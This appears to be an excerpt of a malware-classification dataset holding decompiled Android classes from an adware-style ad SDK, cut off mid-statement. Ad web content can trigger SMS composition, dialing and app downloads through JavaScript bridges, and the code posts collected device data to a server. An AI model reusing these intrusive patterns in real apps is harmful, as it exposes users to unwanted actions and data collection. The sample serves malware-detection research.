"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\b.code","public interface b {   void a();   void a(  String str);   void b();   void c();   void d();   void e();   void f(); } !org.eclipse.jdt.core.dom.TypeDeclaration@6f842c54!org.eclipse.jdt.core.dom.TypeDeclaration@6ea799eepublic class b extends WebChromeClient {   private b(){   }   @Override public void onShowCustomView(  View view,  WebChromeClient.CustomViewCallback customViewCallback){     super.onShowCustomView(view,customViewCallback);     if (view instanceof FrameLayout) {       FrameLayout frameLayout=(FrameLayout)view;       if (frameLayout.getFocusedChild() instanceof VideoView) {         MraidView.this.s=(VideoView)((FrameLayout)view).getFocusedChild();         frameLayout.removeView(MraidView.this.s);         ((ViewGroup)MraidView.this.getParent()).addView(MraidView.this.s);         MraidView.this.s.setOnCompletionListener(new MediaPlayer.OnCompletionListener(){           @Override public void onCompletion(          MediaPlayer mediaPlayer){             try {               mediaPlayer.stop();               MraidView.this.g(""99"");               MraidView.this.a(true);             }  catch (            Exception e) {             }           }         } );         MraidView.this.s.setOnErrorListener(new MediaPlayer.OnErrorListener(){           @Override public boolean onError(          MediaPlayer mediaPlayer,          int i,          int i2){             MraidView.this.g(""89"");             MraidView.this.a(true);             return false;           }         } );         MraidView.this.s.start();         MraidView.this.a(false);       }     }   }   @Override public void onHideCustomView(){     if (MraidView.this.s != null) {       ((ViewGroup)MraidView.this.getParent()).removeView(MraidView.this.s);       if (MraidView.this.s.isPlaying()) {         MraidView.this.s.stopPlayback();       }     }     MraidView.this.a(true);   } } public static class b extends IOException {   private static final long serialVersionUID=1;   public b(  String str){     super(str);   } } private class b extends Dialog implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   public b(  Context context,  String str){     super(context);     try {       requestWindowFeature(1);       getWindow().setBackgroundDrawable(new ColorDrawable(0));       setCancelable(true);       setCanceledOnTouchOutside(false);       setOnCancelListener(this);       setOnDismissListener(this);       LinearLayout linearLayout=new LinearLayout(context);       linearLayout.setOrientation(1);       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);       layoutParams.gravity=17;       linearLayout.setLayoutParams(layoutParams);       RelativeLayout relativeLayout=new RelativeLayout(context);       relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-2,-2));       Button button=new Button(context);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);       layoutParams2.addRule(11,-1);       layoutParams2.bottomMargin=0;       button.setPadding(0,0,0,0);       button.setGravity(17);       button.setLayoutParams(layoutParams2);       button.setText(""X"");       button.setTextSize(15.0f);       button.setTypeface(Typeface.DEFAULT,1);       button.setTextColor(-1);       button.setBackgroundColor(0);       button.setOnClickListener(new View.OnClickListener(){         @Override public void onClick(        View view){           b.this.dismiss();           SmartWallActivity.this.finish();         }       } );       WebView unused=SmartWallActivity.d=new WebView(context);       SmartWallActivity.d.getSettings().setJavaScriptEnabled(true);       SmartWallActivity.d.setWebChromeClient(new WebChromeClient());       SmartWallActivity.d.setScrollBarStyle(33554432);       SmartWallActivity.d.setWebViewClient(new WebViewClient(){         @Override public void onPageFinished(        WebView webView,        String str2){           super.onPageFinished(webView,str2);           try {             if (SmartWallActivity.this.k != null) {               SmartWallActivity.this.k.dismiss();             }             b.this.show();           }  catch (          Exception e) {             SmartWallActivity.this.finish();           }         }         @Override public void onReceivedError(        WebView webView,        int i,        String str2,        String str3){           try {             if (SmartWallActivity.this.k != null) {               SmartWallActivity.this.k.dismiss();             }             if (SmartWallActivity.this.i != null) {               SmartWallActivity.this.i.dismiss();             }           }  catch (          Throwable th) {             Log.e(SmartWallActivity.c,""Error occurred while loading landing page: code "" + i + "", desc: ""+ str2);           }           SmartWallActivity.this.finish();         }         @Override public boolean shouldOverrideUrlLoading(        WebView webView,        String str2){           try {             o.a(""SmartWall Url: "" + str2);             try {               if (SmartWallActivity.this.i != null) {                 if (SmartWallActivity.d != null) {                   SmartWallActivity.d.stopLoading();                   SmartWallActivity.d.removeAllViews();                   SmartWallActivity.d.destroy();                 }                 SmartWallActivity.this.i.dismiss();               }             }  catch (            Exception e) {             } catch (            Throwable th) {             }             Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str2));             intent.addFlags(268435456);             intent.addFlags(8388608);             SmartWallActivity.this.startActivity(intent);             SmartWallActivity.this.finish();             return true;           }  catch (          Exception e2) {             e2.printStackTrace();             return false;           }         }       } );       SmartWallActivity.d.loadUrl(str);       relativeLayout.addView(button);       linearLayout.addView(relativeLayout);       linearLayout.addView(SmartWallActivity.d,layoutParams);       setContentView(linearLayout);     }  catch (    Exception e) {       Log.e(""AirplaySDK"",""An error occured while starting LandingPageAd."");       SmartWallActivity.this.finish();     }   }   @Override public void onCancel(  DialogInterface dialogInterface){     if (dialogInterface != null) {       try {         dialogInterface.dismiss();       }  catch (      Exception e) {         return;       }     }     SmartWallActivity.this.finish();   }   @Override public void onDismiss(  DialogInterface dialogInterface){     if (dialogInterface != null) {       try {         dialogInterface.dismiss();       }  catch (      Exception e) {         return;       }     }     SmartWallActivity.this.finish();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\BrowserActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@121c7518"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\BrowserView.code","public class BrowserView extends WebView {   void a(){     if (Build.VERSION.SDK_INT >= 8) {       getSettings().setPluginState(WebSettings.PluginState.ON_DEMAND);     }  else {       getSettings().setPluginsEnabled(true);     }   }   private void b(){     try {       if (Build.VERSION.SDK_INT >= 11) {         BrowserActivity.this.getWindow().setFlags(16777216,16777216);       }     }  catch (    Throwable th) {     }   }   public BrowserView(  Context context,  String str){     super(context);     setHorizontalScrollBarEnabled(false);     setVerticalScrollBarEnabled(false);     setScrollBarStyle(33554432);     setBackgroundColor(0);     CookieSyncManager.createInstance(BrowserActivity.this);     CookieSyncManager.getInstance().startSync();     getSettings().setJavaScriptEnabled(true);     a();     b();     setWebChromeClient(new WebChromeClient(){       @Override public void onProgressChanged(      WebView webView,      int i){         r3.setTitle(""loading...."");         r3.setProgress(i * 100);         if (i == 100) {           r3.setTitle(webView.getUrl());         }       }       @Override public void onHideCustomView(){       }       @Override public void onShowCustomView(      View view,      WebChromeClient.CustomViewCallback customViewCallback){       }     } );     setWebViewClient(new WebViewClient(){       @Override public void onPageFinished(      WebView webView,      String str2){         super.onPageFinished(webView,str2);         if ((webView != null) & webView.canGoBack()) {           BrowserActivity.this.c.setEnabled(true);         }  else {           BrowserActivity.this.c.setEnabled(false);         }         if ((webView != null) & webView.canGoForward()) {           BrowserActivity.this.d.setEnabled(true);         }  else {           BrowserActivity.this.d.setEnabled(false);         }       }       @Override public boolean shouldOverrideUrlLoading(      WebView webView,      String str2){         if (!str2.startsWith(""market://"")) {           return super.shouldOverrideUrlLoading(webView,str2);         }         webView.loadUrl(str2);         return true;       }       @Override public void onReceivedError(      WebView webView,      int i,      String str2,      String str3){         super.onReceivedError(webView,i,str2,str3);         Log.i(""AirplayMraid"",""Error code: "" + i + "" ,description: ""+ str2);         try {           BrowserActivity.this.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str3)));           BrowserActivity.this.finish();         }  catch (        Exception e) {         }       }     } );   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\c.code","interface c<T> {   void a();   void a(  T t); } public class c {   boolean a=false;   c(){   }   String a(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""width"",MraidView.this.j);       jSONObject.put(""height"",MraidView.this.k);       jSONObject.put(""useCustomClose"",this.a);       jSONObject.put(""isModal"",true);     }  catch (    JSONException e) {       e.printStackTrace();     }     return jSONObject.toString();   }   void a(  String str){     int i;     int i2;     try {       JSONObject jSONObject=new JSONObject(str);       MraidView mraidView=MraidView.this;       if (jSONObject.isNull(""width"")) {         i=MraidView.this.j;       }  else {         i=jSONObject.getInt(""width"");       }       mraidView.h=i;       MraidView mraidView2=MraidView.this;       if (jSONObject.isNull(""height"")) {         i2=MraidView.this.k;       }  else {         i2=jSONObject.getInt(""height"");       }       mraidView2.i=i2;       this.a=jSONObject.isNull(""useCustomClose"") ? false : jSONObject.getBoolean(""useCustomClose"");     }  catch (    JSONException e) {       e.printStackTrace();     } catch (    Exception e2) {       MraidView.this.b(""setExpandProperties"",""An error occured while parsing expand properties json;"");     }   } } public static class c extends IOException {   private static final long serialVersionUID=1;   private int a;   public c(  String str,  String str2){     super(str);     try {       this.a=Integer.parseInt(str2);     }  catch (    NumberFormatException e) {     }   }   public int a(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\C0029a.code","public class C0029a {   public C0029a(){   }   @JavascriptInterface public void closewin(){     SmartWallActivity.this.h.dismiss();     SmartWallActivity.this.finish();   }   @JavascriptInterface public void triggerEvent(  String str){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\d.code","class d {   private final String a=""ad_cache"";   private SharedPreferences b;   private SharedPreferences.Editor c;   public d(  Context context) throws NullPointerException {     this.b=context.getSharedPreferences(""ad_cache"",0);   }   public boolean a(  a.EnumC0031a enumC0031a,  String str,  String str2) throws Exception {     this.c=this.b.edit();     this.c.putString("""" + enumC0031a,str);     this.c.putString(""video_url"",str2);     return this.c.commit();   }   public void a(  a.EnumC0031a enumC0031a) throws Exception {     this.c=this.b.edit();     this.c.remove("""" + enumC0031a);     this.c.commit();   }   public void b(  a.EnumC0031a enumC0031a) throws Exception {     this.c=this.b.edit();     this.c.remove(enumC0031a.toString());     this.c.remove(""video_url"");     this.c.commit();   }   public void a(  boolean z){     this.c=this.b.edit();     this.c.putBoolean(""thisSmartWall"",z);     this.c.commit();   }   public boolean a(){     return this.b.getBoolean(""thisSmartWall"",false);   } } public class d extends h {   public d(){   }   @Override @JavascriptInterface public void printJSLog(  String str){     Log.i(""AirplayMraid"",""JS Log: "" + str);   }   @JavascriptInterface public void expand(){     expand("""");   }   @JavascriptInterface public void expand(  final String str){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.b(str);       }     } );   }   @JavascriptInterface public void close(){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.c();       }     } );   }   @Override @JavascriptInterface public void open(  String str){     if (MraidView.this.d != null) {       MraidView.this.d.e();     }     Intent intent=new Intent(MraidView.this.getContext(),(Class<?>)BrowserActivity.class);     intent.setAction(""browser"");     intent.addFlags(268435456);     intent.addFlags(8388608);     intent.putExtra(""url"",str);     try {       MraidView.this.getContext().startActivity(intent);       MraidView.this.g(""96"");     }  catch (    ActivityNotFoundException e) {       Log.e(""AirplayMraid"",""Required BrowserActivty is not added in manifest please add."");       if (MraidView.this.d != null) {         MraidView.this.d.a(""Required BrowserActivty is not added in manifest please add."");       }       MraidView.this.g(""89"");     }     MraidView.this.a(true);   }   @Override @JavascriptInterface public void setExpandProperties(  String str){     o.a(""Expand Json: "" + str);     if (MraidView.this.l != null) {       MraidView.this.l.a(str);       return;     }     MraidView.this.l=new c();     MraidView.this.l.a(str);   }   @Override @JavascriptInterface public void setResizeProperties(  String str){     if (MraidView.this.t != null) {       MraidView.this.t.a(str);     }   }   @JavascriptInterface public void resize(){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.b();       }     } );   }   @JavascriptInterface public void playVideo(  final String str){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.d(str);       }     } );   }   @JavascriptInterface public void storePicture(  final String str,  final String str2){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.a(str,str2);       }     } );   }   @JavascriptInterface public void createCalendarEvent(  final String str){     MraidView.this.post(new Runnable(){       @Override public void run(){         MraidView.this.c(str);       }     } );   }   @Override @JavascriptInterface public void setOrientationProperties(  String str){     o.a(""Orientation json: "" + str);     try {       JSONObject jSONObject=new JSONObject(str);       boolean z=jSONObject.isNull(""allowOrientationChange"") ? true : jSONObject.getBoolean(""allowOrientationChange"");       MraidView.this.t.b(jSONObject.isNull(""forceOrientation"") ? ""none"" : jSONObject.getString(""forceOrientation""));       MraidView.this.t.a(z);       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.h();         }       } );     }  catch (    Exception e) {       MraidView.this.b(""setOrientationProperties"",""Error occured in while parsing orientation json."");     }   }   @Override @JavascriptInterface public void showDialer(  String str){     Log.i(""AirplayMraid"",""Showing dialer....."");     try {       if (MraidView.this.d != null) {         MraidView.this.d.e();       }     }  catch (    ActivityNotFoundException e) {       MraidView.this.b(""showDialer"",""Error occurred while dialing number."");       Log.e(""AirplayMraid"",""Error whlie displaying push ad......: "" + e.getMessage());       MraidView.this.g(""89"");     }     if (str == null || str.equals("""")) {       MraidView.this.b(""showDialer"",""Phone numer is null."");       return;     }     Intent intent=new Intent(""android.intent.action.DIAL"",Uri.parse(""tel:"" + str));     intent.addFlags(268435456);     intent.addFlags(8388608);     MraidView.this.getContext().startActivity(intent);     MraidView.this.g(""97"");     MraidView.this.a(true);   }   @Override @JavascriptInterface public void sendSms(  String str,  String str2){     Log.i(""AirplayMraid"",""Sending SMS....."");     try {       if (MraidView.this.d != null) {         MraidView.this.d.e();       }     }  catch (    Exception e) {       Log.e(""AirplayMraid"",""Error whlie displaying push ad......: "" + e.getMessage());       MraidView.this.b(""sendSms"",""Error occurred while sending message"");       MraidView.this.g(""error"");     }     if (str == null || str.equals("""")) {       MraidView.this.b(""sendSms"",""Numer is null."");       return;     }     if (str2 == null || str2.equals("""")) {       MraidView.this.b(""sendSms"",""SMS text is null."");       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setType(""vnd.android-dir/mms-sms"");     intent.putExtra(""address"",str);     intent.putExtra(""sms_body"",str2);     MraidView.this.getContext().startActivity(intent);     MraidView.this.g(""98"");     MraidView.this.a(true);   }   @Override @JavascriptInterface public void downloadApp(  String str){     try {       if (MraidView.this.d != null) {         MraidView.this.d.e();       }       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));       intent.setFlags(268435456);       intent.addFlags(8388608);       MraidView.this.getContext().startActivity(intent);       MraidView.this.g(""77"");     }  catch (    Exception e) {       Log.e(""AirplayMraid"",""Error whlie displaying App......: "" + e.getMessage());       MraidView.this.b(""downloadApp"",""Error occurred while redirecting to market."");       MraidView.this.g(""error"");     }     MraidView.this.a(true);   }   @Override @JavascriptInterface public void showLocation(  String str,  String str2){     try {       if (MraidView.this.d != null) {         MraidView.this.d.e();       }       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(String.format(Locale.ENGLISH,""geo:%f,%f"",str,str2)));       intent.setFlags(268435456);       intent.addFlags(8388608);       MraidView.this.getContext().startActivity(intent);       MraidView.this.g(""79"");     }  catch (    Exception e) {       Log.e(""AirplayMraid"",""Error occurred whlie displaying Location......: "" + e.getMessage());       MraidView.this.b(""showLoaction"",""Error occurred while showing location."");       MraidView.this.g(""error"");     }     MraidView.this.a(true);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\e.code","abstract class e {   static final String EVENT_RECURRENCE=""rrule"";   static final String EVENT_REMINDER=""reminder"";   static final String EVENT_TRANSPARENCY=""transparency"";   public static void a(  Activity activity,  String str) throws ActivityNotFoundException, Exception {     JSONObject jSONObject=new JSONObject(str);     String string=jSONObject.isNull(AnalyticsEvent.EVENT_ID) ? """" : jSONObject.getString(AnalyticsEvent.EVENT_ID);     String string2=jSONObject.isNull(""summary"") ? """" : jSONObject.getString(""summary"");     String string3=jSONObject.isNull(""location"") ? """" : jSONObject.getString(""location"");     String string4=jSONObject.isNull(""description"") ? """" : jSONObject.getString(""description"");     String string5=jSONObject.isNull(""start"") ? """" : jSONObject.getString(""start"");     String string6=jSONObject.isNull(""end"") ? """" : jSONObject.getString(""end"");     String string7=jSONObject.isNull(""status"") ? """" : jSONObject.getString(""status"");     String string8=jSONObject.isNull(EVENT_TRANSPARENCY) ? """" : jSONObject.getString(EVENT_TRANSPARENCY);     String string9=jSONObject.isNull(EVENT_REMINDER) ? """" : jSONObject.getString(EVENT_REMINDER);     a aVar=new a(jSONObject.isNull(""recurrence"") ? """" : jSONObject.getString(""recurrence""));     Intent intent=new Intent(""android.intent.action.INSERT"");     intent.setAction(""android.intent.action.EDIT"");     intent.setType(""vnd.android.cursor.item/event"");     intent.putExtra(""calendar_id"",string);     intent.putExtra(""title"",string2);     intent.putExtra(""eventLocation"",string3);     intent.putExtra(""description"",string4);     intent.putExtra(""beginTime"",a(string5));     intent.putExtra(""endTime"",a(string6));     intent.putExtra(""eventStatus"",string7);     intent.putExtra(EVENT_TRANSPARENCY,string8);     intent.putExtra(EVENT_RECURRENCE,aVar.b());     intent.putExtra(""exdate"",aVar.a());     if (string9 != null) {       try {         if (!string9.equals("""")) {           intent.putExtra(""event_id"",string);           intent.putExtra(""method"",0);           if (string9.startsWith(""-"")) {             intent.putExtra(""minutes"",string9);           }  else {             intent.putExtra(""minutes"",a(string9));           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     activity.startActivityForResult(intent,7);   }   static long a(  String str) throws Exception {     SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ssZ"");     simpleDateFormat.setTimeZone(TimeZone.getTimeZone(""UTC""));     Date parse=simpleDateFormat.parse(str);     System.out.println(parse);     SimpleDateFormat simpleDateFormat2=new SimpleDateFormat();     simpleDateFormat2.setTimeZone(TimeZone.getTimeZone(""UTC""));     return DateFormat.getInstance().parse(simpleDateFormat2.format(parse)).getTime();   } public static class a {     String[] a={""SU"",""MO"",""TU"",""WE"",""TH"",""FR"",""SA""};     final String b=""frequency"";     final String c=""interval"";     final String d=""expires"";     final String e=""exceptionDates"";     final String f=""daysInWeek"";     final String g=""daysInMonth"";     final String h=""daysInYear"";     final String i=""weeksInMonth"";     final String j=""monthsInYear"";     String k;     short l;     String m;     String[] n;     short[] o;     short[] p;     short[] q;     short[] r;     short[] s;     final JSONObject t;     public a(    String str) throws NullPointerException, JSONException {       this.t=new JSONObject(str);       this.k=this.t.isNull(""frequency"") ? """" : this.t.getString(""frequency"");       this.l=this.t.isNull(""interval"") ? (short)0 : Short.parseShort(this.t.getString(""interval""));       this.m=this.t.isNull(""expires"") ? """" : this.t.getString(""expires"");       JSONArray jSONArray=this.t.isNull(""exceptionDates"") ? null : this.t.getJSONArray(""exceptionDates"");       if (jSONArray != null) {         this.n=new String[jSONArray.length()];         for (int i=0; i < this.n.length; i++) {           this.n[i]=jSONArray.getString(i);         }       }       this.o=a(""daysInWeek"");       this.p=a(""daysInMonth"");       this.q=a(""daysInYear"");       this.r=a(""weeksInMonth"");       this.s=a(""monthsInYear"");     }     final short[] a(    String str) throws NullPointerException, JSONException {       JSONArray jSONArray=this.t.isNull(str) ? null : this.t.getJSONArray(str);       if (jSONArray == null) {         return null;       }       short[] sArr=new short[jSONArray.length()];       for (int i=0; i < sArr.length; i++) {         sArr[i]=(short)jSONArray.getInt(i);       }       return sArr;     }     public String a(    short[] sArr){       String str="""";       for (int i=0; i < sArr.length; i++) {         if (i == 0) {           str="""" + this.a[sArr[i]];         }  else {           str=str + "","" + this.a[sArr[i]];         }       }       return str;     }     public String a(    String[] strArr) throws Exception {       String str="""";       for (int i=0; i < strArr.length; i++) {         if (i == 0) {           Date parse=new SimpleDateFormat(""yyyy-MM-dd"").parse(strArr[i]);           System.out.println(""dt: "" + parse);           str="""" + new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse);         }  else {           Date parse2=new SimpleDateFormat(""yyyy-MM-dd"").parse(strArr[i]);           System.out.println(""dt: "" + parse2);           str=str + "","" + new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse2);         }       }       return str;     }     public String b(    String str) throws Exception {       Date parse=new SimpleDateFormat(""yyyy-MM-dd"").parse(str);       System.out.println(""dt: "" + parse);       return new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse);     }     String a() throws Exception {       return this.n != null ? a(this.n) : """";     }     public String b(){       StringBuilder sb=new StringBuilder();       try {         if (this.k != null && !this.k.equals("""")) {           sb.append(""FREQ="" + this.k + "";"");         }         if (this.l != 0) {           sb.append(""INTERVAL="" + ((int)this.l) + "";"");         }         if (this.m != null && !this.m.equals("""")) {           sb.append(""UNTIL="" + b(this.m) + "";"");         }         if (this.o != null) {           sb.append(""BYDAY="" + a(this.o) + "";"");         }         if (this.p != null) {           sb.append(""BYMONTHDAY="" + this.p + "";"");         }         if (this.q != null) {           sb.append(""BYYEARDAY="" + this.q + "";"");         }         if (this.r != null) {           sb.append(""BYWEEKNO="" + this.r + "";"");         }         if (this.s != null) {           sb.append(""BYMONTH="" + this.s + "";"");         }         o.a(""Rrule: "" + sb.toString());       }  catch (      Exception e) {         e.printStackTrace();       }       return sb.toString();     }   } } public static class e {   private String b;   private boolean d;   private String a="""";   private boolean c=false;   public String a(){     return this.a;   }   public void a(  String str){     this.a=str;   }   public String b(){     return this.b;   }   public void b(  String str){     this.b=str;   }   public void a(  boolean z){     this.d=z;   }   public boolean c(){     return this.d;   }   public int c(  String str){     if (str.equals(""top-right"")) {       return 53;     }     if (str.equals(""bottom-center"")) {       return 81;     }     if (str.equals(""bottom-left"")) {       return 83;     }     if (str.equals(""bottom-right"")) {       return 85;     }     if (str.equals(""center"")) {       return 17;     }     if (str.equals(""top-center"")) {       return 49;     }     return str.equals(""top-left"") ? 51 : 53;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1b82fbb"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\g.code","final class g extends AsyncTask<Void,Void,Void> {   Bitmap a=null;   final String b;   final c<Bitmap> c;   public g(  String str,  c<Bitmap> cVar){     this.b=str;     this.c=cVar;     o.a(""Image URL: "" + str);   }   @Override public java.lang.Void doInBackground(  java.lang.Void... r8){     throw new UnsupportedOperationException(""Method not decompiled: com.lntasllo.pzdcmwai3830.g.doInBackground(java.lang.Void[]):java.lang.Void"");   }   @Override public void onPostExecute(  Void r3){     if (this.c != null) {       this.c.a(this.a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\h.code","abstract class h {   abstract void downloadApp(  String str);   abstract void open(  String str);   abstract void printJSLog(  String str);   abstract void sendSms(  String str,  String str2);   abstract void setExpandProperties(  String str);   abstract void setOrientationProperties(  String str);   abstract void setResizeProperties(  String str);   abstract void showDialer(  String str);   abstract void showLocation(  String str,  String str2); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\i.code","final class i implements Runnable {   private static final String ENCODING_GZIP=""gzip"";   private static final String HEADER_ACCEPT_ENCODING=""Accept-Encoding"";   final Context a;   final c<String> b;   final List<NameValuePair> c;   final String d;   final long e;   final boolean f;   public i(  Context context,  c<String> cVar,  List<NameValuePair> list,  String str,  long j,  boolean z){     this.a=context;     this.b=cVar;     this.c=list;     this.d=str;     o.a(""Url: "" + str);     this.e=j;     this.f=z;   }   @Override public void run(){ synchronized (this) {       if (this.e != 0) {         try {           o.a(""Thread is waiting for "" + this.e + "" ms."");           wait(this.e);         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }       if (o.o(this.a)) {         try {           try {             try {               if (this.f) {                 this.c.addAll(m.a(this.a));               }               HttpPost httpPost=new HttpPost(this.d);               o.a(""Values: "" + this.c);               httpPost.setEntity(new UrlEncodedFormEntity(this.c));               BasicHttpParams basicHttpParams=new BasicHttpParams();               HttpConnectionParams.setConnectionTimeout(basicHttpParams,7000);               HttpConnectionParams.setSoTimeout(basicHttpParams,7000);               DefaultHttpClient defaultHttpClient=new DefaultHttpClient(basicHttpParams);               defaultHttpClient.addRequestInterceptor(new HttpRequestInterceptor(){                 @Override public void process(                HttpRequest httpRequest,                HttpContext httpContext){                   if (!httpRequest.containsHeader(i.HEADER_ACCEPT_ENCODING)) {                     httpRequest.addHeader(i.HEADER_ACCEPT_ENCODING,i.ENCODING_GZIP);                   }                 }               } );               defaultHttpClient.addResponseInterceptor(new HttpResponseInterceptor(){                 @Override public void process(                HttpResponse httpResponse,                HttpContext httpContext){                   Header contentEncoding=httpResponse.getEntity().getContentEncoding();                   if (contentEncoding != null) {                     HeaderElement[] elements=contentEncoding.getElements();                     for (                    HeaderElement headerElement : elements) {                       if (headerElement.getName().equalsIgnoreCase(i.ENCODING_GZIP)) {                         httpResponse.setEntity(new a(httpResponse.getEntity()));                         return;                       }                     }                   }                 }               } );               BasicHttpResponse basicHttpResponse=(BasicHttpResponse)defaultHttpClient.execute(httpPost);               int statusCode=basicHttpResponse.getStatusLine().getStatusCode();               Log.i(""AirplaySDK"",""Status Code: "" + statusCode);               if (statusCode == 200) {                 String entityUtils=EntityUtils.toString(basicHttpResponse.getEntity());                 o.a(""Response String:"" + entityUtils);                 if (entityUtils != null && !entityUtils.equals("""")) {                   this.b.a(entityUtils);                   return;                 }               }  else {                 Log.i(""AirplaySDK"",""HTTP response reason: "" + basicHttpResponse.getStatusLine().getReasonPhrase());               }             }  catch (            MalformedURLException e2) {               Log.d(""MalformedURLException Thrown"",e2.toString());             } catch (            ClientProtocolException e3) {               Log.d(""ClientProtocolException Thrown"",e3.toString());             }           }  catch (          SocketTimeoutException e4) {             Log.d(""SocketTimeoutException Thrown"",e4.toString());           } catch (          SSLPeerUnverifiedException e5) {             Log.d(""SSL Exception: "",e5.getMessage());           }         }  catch (        IOException e6) {           Log.d(""IOException Thrown"",e6.toString());         } catch (        Exception e7) {           Log.d(""Exception Thrown: "","""" + e7.getMessage());         } catch (        Throwable th) {         }       }       this.b.a(null);     }   } private static class a extends HttpEntityWrapper {     public a(    HttpEntity httpEntity){       super(httpEntity);     }     @Override public InputStream getContent() throws IOException {       return new GZIPInputStream(this.wrappedEntity.getContent());     }     @Override public long getContentLength(){       return -1L;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\ImageBanner.code","public class ImageBanner extends WebView {   private final String a;   private f.a b;   private AdView.a c;   private boolean d;   private AdView e;   private boolean f;   public ImageBanner(  final Context context,  int i,  int i2,  final Handler handler,  f.a aVar,  AdView.a aVar2,  boolean z,  AdView adView){     super(context);     this.a=""AirplayMraid"";     try {       this.d=z;       this.c=aVar2;       this.e=adView;       this.b=aVar;       setVerticalScrollBarEnabled(false);       setHorizontalScrollBarEnabled(false);       setScrollBarStyle(33554432);       getSettings().setJavaScriptEnabled(true);       a();       setBackgroundColor(0);       setWebViewClient(new WebViewClient(){         @Override public boolean shouldOverrideUrlLoading(        WebView webView,        String str){           if ((ImageBanner.this.b.l() || ImageBanner.this.b.n() || ImageBanner.this.b.b()|| ImageBanner.this.b.c()) && ImageBanner.this.f && !str.equals(ImageBanner.this.b.o())) {             Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));             intent.setFlags(268435456);             intent.addFlags(8388608);             context.startActivity(intent);             ImageBanner.this.f=false;           }  else {             webView.loadUrl(str);           }           return true;         }         @Override public void onReceivedError(        WebView webView,        int i3,        String str,        String str2){           super.onReceivedError(webView,i3,str,str2);           ImageBanner.this.a(""89"");           if (handler != null) {             handler.sendEmptyMessage(8);             o.a(""Error in ad loading."");           }           if (AdView.b != null) {             AdView.b.a(str);           }         }         @Override public void onPageFinished(        WebView webView,        String str){           if (handler != null) {             handler.sendEmptyMessage(0);             o.a(""Ad loading complete"");           }           ImageBanner.this.a(""14"");           if (AdView.b != null) {             AdView.b.b();           }         }       } );       if (Build.VERSION.SDK_INT >= 11) {         try {           try {             getClass().getMethod(""setLayerType"",Integer.TYPE,Paint.class).invoke(this,1,null);           }  catch (          IllegalAccessException e) {             e.printStackTrace();           } catch (          Exception e2) {             e2.printStackTrace();           }         }  catch (        IllegalArgumentException e3) {           e3.printStackTrace();         } catch (        NoSuchMethodException e4) {         } catch (        InvocationTargetException e5) {           e5.printStackTrace();         }       }       FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(this.e.getadWidth(),this.e.getadHeight());       if (this.b.b()) {         setLayoutParams(layoutParams);         loadDataWithBaseURL(null,this.b.o(),""text/html"",""UTF-8"",null);         return;       }       if (this.b.c()) {         setLayoutParams(layoutParams);         if (this.b.o() != null && !this.b.o().equals("""")) {           loadUrl(this.b.o());           return;         }  else {           Log.e(""AirplayMraid"",""Url is null"");           return;         }       }       if (this.b.l()) {         setLayoutParams(layoutParams);         StringBuilder sb=new StringBuilder();         sb.append(""<html><head>"" + this.b.o() + ""<style>* {margin:0;padding:0; width: ""+ i+ ""; height: ""+ i2+ "";}</style></head><body>"").append(""</body></html>"");         loadDataWithBaseURL(null,sb.toString(),""text/html"",""UTF-8"",null);         return;       }       if (this.b.n()) {         